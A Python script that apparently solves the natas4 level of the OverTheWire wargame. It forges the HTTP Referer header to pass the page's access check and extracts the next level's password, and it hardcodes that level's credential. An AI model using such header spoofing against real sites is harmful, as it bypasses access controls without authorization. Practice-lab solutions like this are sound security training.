#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
  level3.py
  Solution for natas level3
"""
__author__ = 'kall.micke@gmail.com'

import requests
import sys
import os
import re

level = 4
user = 'natas%s' % level
host = 'http://natas%s.natas.labs.overthewire.org' % level
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'
referer =  'http://natas%s.natas.labs.overthewire.org/' % str(level+1)

def authenticate():

    r = requests.get(host, auth=(user, password),headers={'referer': referer})
    return r

def get_flag():
    content = authenticate()
    return str([c for c in content.text.split('\n') if 'The password for natas5' in c][0].split('is')[1].split()[0])

if __name__ == '__main__':
    print("Flag: %s" % get_flag())
